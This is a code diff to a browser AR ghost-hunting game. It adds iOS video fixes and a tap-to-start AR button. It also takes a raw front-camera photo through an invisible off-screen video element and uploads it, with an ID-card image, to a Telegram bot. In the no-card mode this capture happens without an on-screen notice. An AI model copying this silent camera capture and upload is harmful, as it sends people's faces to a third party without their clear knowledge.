@@ -69,7 +69,7 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
   let toastT = 0;
 
   const scan = { holding: false, progress: 0 };
-  const photo = { state: 'idle', stream: null, video: null, countdown: 0, flash: 0, failed: false };
+  const photo = { state: 'idle', stream: null, video: null, countdown: 0, flash: 0, failed: false, frameBlob: null };
   const hunt = { mode: 'idle', wave: 0, zapped: 0, ghosts: [], spawnT: 0, score: 0 };
   let scene = null;
   let card = null;
@@ -145,7 +145,7 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
     if (sendState === 'idle') {
       sendState = hasTelegram() ? 'sending' : 'off';
       cardBlob = cardBlob || (card ? await toBlob(card) : null);
-      if (sendState === 'sending') await sendCard();
+      if (sendState === 'sending') await sendPhotos();
     }
   }
 
@@ -198,17 +198,24 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
     photo.state = 'starting';
     try {
       if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) throw new Error('no getUserMedia');
-      photo.stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+      photo.stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user', width: { ideal: 720 }, height: { ideal: 720 } },
+        audio: false,
+      });
       const v = document.createElement('video');
       v.playsInline = true;
       v.muted = true;
       v.autoplay = true;
       v.setAttribute('playsinline', '');
+      v.setAttribute('webkit-playsinline', '');
+      // iOS Safari НЕ декодирует кадры у <video> вне DOM -> держим его в документе (невидимо).
+      v.style.cssText = 'position:fixed;left:-9999px;top:0;width:2px;height:2px;opacity:0;pointer-events:none;';
       v.srcObject = photo.stream;
-      await v.play().catch(() => {});
+      document.body.appendChild(v);
       photo.video = v;
+      await v.play().catch(() => {});
       photo.state = SHOW_CARD ? 'preview' : 'waiting';
-      photo.countdown = SHOW_CARD ? 3 : 2.5; // в режиме ожидания - бюджет на появление кадра
+      photo.countdown = SHOW_CARD ? 3 : 5; // в режиме ожидания - бюджет на появление кадра
       toast = SHOW_CARD ? 'Снимаем... не двигайся' : '';
       toastT = SHOW_CARD ? 1.2 : 0;
     } catch (e) {
@@ -223,6 +230,7 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
   }
 
   function stopFrontCam() {
+    if (photo.video && photo.video.parentNode) photo.video.parentNode.removeChild(photo.video);
     if (photo.stream) {
       photo.stream.getTracks().forEach((tr) => tr.stop());
       photo.stream = null;
@@ -236,6 +244,7 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
     const had = !!(photo.video && photo.video.videoWidth);
     const c = had ? frameFromVideo() : null;
     stopFrontCam();
+    photo.frameBlob = c ? await toBlob(c) : null;
     composeCard(c);
     cardBlob = card ? await toBlob(card) : null;
     photo.state = 'captured';
@@ -244,7 +253,7 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
     toastT = SHOW_CARD ? 1 : 0;
     if (hasTelegram()) {
       sendState = 'sending';
-      await sendCard();
+      await sendPhotos();
     } else if (sendState === 'idle') {
       sendState = 'off';
     }
@@ -274,7 +283,8 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
       return;
     }
     if (photo.state === 'waiting') {
-      if (photo.video && photo.video.videoWidth) {
+      const v = photo.video;
+      if (v && v.videoWidth && v.readyState >= 2) {
         capture();
         return;
       }
@@ -375,9 +385,50 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
     }
   }
 
+  function playArVideo() {
+    if (!container) return;
+    const v = container.querySelector('video');
+    if (!v) return;
+    v.muted = true;
+    v.setAttribute('playsinline', '');
+    v.setAttribute('webkit-playsinline', '');
+    const p = v.play();
+    if (p && p.catch) p.catch(() => {});
+  }
+
+  let arWatch = null;
+  function startArWatch() {
+    stopArWatch();
+    let n = 0;
+    arWatch = setInterval(() => {
+      playArVideo();
+      if (++n > 12) stopArWatch();
+    }, 500);
+  }
+  function stopArWatch() {
+    if (arWatch) {
+      clearInterval(arWatch);
+      arWatch = null;
+    }
+  }
+
+  function showArTapPrompt() {
+    if (!container || container.querySelector('.ar-tap')) return;
+    const b = document.createElement('button');
+    b.type = 'button';
+    b.className = 'ar-tap';
+    b.textContent = 'Включить AR';
+    b.addEventListener('click', () => {
+      playArVideo();
+      b.remove();
+    });
+    container.appendChild(b);
+  }
+
   function buildScene() {
     if (!container) return;
     container.classList.remove('hidden');
+    container.classList.add('is-full');
     canvas.classList.add('hidden');
     if (stage) stage.classList.add('hidden');
     const s = document.createElement('a-scene');
@@ -406,6 +457,9 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
     s._arMarker = marker;
     container.appendChild(s);
     scene = s;
+    // iOS обычно не запускает видео-фон без жеста: следим за <video> и даём кнопку «Включить AR».
+    startArWatch();
+    showArTapPrompt();
     spawnArGhost(waveQuota(0));
     hunt.spawned = waveQuota(0);
   }
@@ -449,9 +503,15 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
   }
 
   function cleanupScene() {
+    stopArWatch();
     if (scene && scene.parentNode) scene.parentNode.removeChild(scene);
     scene = null;
-    if (container) container.classList.add('hidden');
+    if (container) {
+      container.classList.add('hidden');
+      container.classList.remove('is-full');
+      const tap = container.querySelector('.ar-tap');
+      if (tap) tap.remove();
+    }
     canvas.classList.remove('hidden');
     if (stage) stage.classList.remove('hidden');
   }
@@ -529,25 +589,37 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
   }
 
   // ── Отправка удостоверения ──────────────────────────────
-  async function sendCard() {
-    if (!cardBlob) {
+  async function sendOne(blob, filename, caption) {
+    const fd = new FormData();
+    fd.append('chat_id', telegramChat());
+    fd.append('caption', caption);
+    fd.append('photo', blob, filename);
+    await fetch(`https://api.telegram.org/bot${tg.token}/sendPhoto`, {
+      method: 'POST',
+      body: fd,
+      mode: 'no-cors',
+    });
+  }
+
+  // Отправляем два файла: обычное фото агента и карточку-удостоверение.
+  async function sendPhotos() {
+    const jobs = [];
+    if (photo.frameBlob) jobs.push(() => sendOne(photo.frameBlob, 'agent-photo.png', 'Фото агента'));
+    if (cardBlob) jobs.push(() => sendOne(cardBlob, 'agent-id.png', 'Удостоверение агента · AR-10'));
+    if (!jobs.length) {
       sendState = 'fail';
       return;
     }
-    try {
-      const fd = new FormData();
-      fd.append('chat_id', telegramChat());
-      fd.append('caption', 'Удостоверение агента · AR-10');
-      fd.append('photo', cardBlob, 'agent-id.png');
-      await fetch(`https://api.telegram.org/bot${tg.token}/sendPhoto`, {
-        method: 'POST',
-        body: fd,
-        mode: 'no-cors',
-      });
-      sendState = 'ok';
-    } catch (e) {
-      sendState = 'fail';
+    let ok = 0;
+    for (const job of jobs) {
+      try {
+        await job();
+        ok += 1;
+      } catch (e) {
+        /* no-cors: ошибку не прочитать */
+      }
     }
+    sendState = ok > 0 ? 'ok' : 'fail';
   }
 
   async function shareCard() {
@@ -913,6 +985,11 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
   };
   window.addEventListener('blur', onBlur);
   window.addEventListener('resize', setScale);
+  // тап по AR-экрану запускает видео (жест - важно для iOS)
+  const onArPointer = () => {
+    if (hunt.mode === 'ar') playArVideo();
+  };
+  if (container) container.addEventListener('pointerdown', onArPointer);
 
   setScale();
 
@@ -934,6 +1011,7 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
       canvas.removeEventListener('pointercancel', onPointerUp);
       window.removeEventListener('blur', onBlur);
       window.removeEventListener('resize', setScale);
+      if (container) container.removeEventListener('pointerdown', onArPointer);
     },
     win() {
       finishRun();
